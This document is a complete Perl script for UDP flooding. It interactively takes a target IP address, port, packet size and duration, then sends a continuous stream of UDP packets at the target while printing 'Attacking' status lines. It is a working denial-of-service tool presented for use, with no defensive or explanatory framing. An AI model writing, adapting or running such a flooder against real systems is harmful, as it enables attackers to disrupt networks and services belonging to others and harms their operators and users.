#!/usr/bin/perl

# UDP Flooding

use Socket;
use strict;
use Time::HiRes qw( usleep ) ;
my $ip;
my $port;
my $size;
my $time;
my $packet_string;
for (0..1023) { $packet_string .= chr( int(rand(25) + 65) ); }
# Set info needed

print "\n============================";
print "\n[!] Enter the designated ip: "; # Set IP
$ip = <STDIN>;
chomp ($ip);
while (!($ip =~ /(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/)){
	print "\n[!] Enter the designated ip correctly: "; # Re-enter IP
	$ip = <STDIN>;
	chomp ($ip);
}

print "Designated IP ==> $ip";
print "\n============================";
print "\n[!] Enter UDP Port (0 for random): "; # Set Port
$port = <STDIN>;
chomp ($port);
while (not ($port =~ /^-?\d+$/ ) || ($port < 0 || $port > 65535)){ 
	print "\n[!] Enter a UDP port correctly (0 for random): "; # Re-enter Port       
	$port = <STDIN>;
	chomp ($port); 
}
print "Designated Port ==> $port";
print "\n============================";

print "\n[!] Enter packet size between 64 and 1024 (0 for random): "; # Set packet size
$size = <STDIN>;
chomp ($size);
while (not ($port =~ /^-?\d+$/ ) || (($size < 64 && $size != 0) || $size > 1500 )){ 
	print "   [!] Enter a packet size between 64 and 1024 correctly (0 for random): "; # Re-enter packet size       
	$size = <STDIN>;
	chomp ($size); 
}
print "Designated packet size ==> $size";
print "\n============================";
print "\n[!] Enter the designated time to run in seconds (0 for continuous flooding): "; # Set time to run
$time = <STDIN>;
chomp ($time);
while (!($time =~ /^-?\d+$/ )){
	print "\n[!] Enter the designated time to run correctly seconds (0 for continuous flooding) : "; # Re-enter time to run
	$time = <STDIN>;
	chomp ($time);
}
print "Designated time ==> $time";
print "\n============================";

usleep(1000000);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cant resolve the hostname try again $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "\n[~] Attacing the IP: $ip"; 
print "\n[~] Attacking the UDP port: $port"; 
print "\n[~] Attacking with size: ". ($size ? "$size bytes" : "random"); 
print "\n[~] Attacking: ". ($time ? "for $time seconds" : "continuously"); 
print "\n[~] Press CTRL+C to stop the attack  \n";
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65535-1))+1;
  send(flood, pack("a$psize", $packet_string), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000);
}
print "\n[~] Finished Attack!"; 
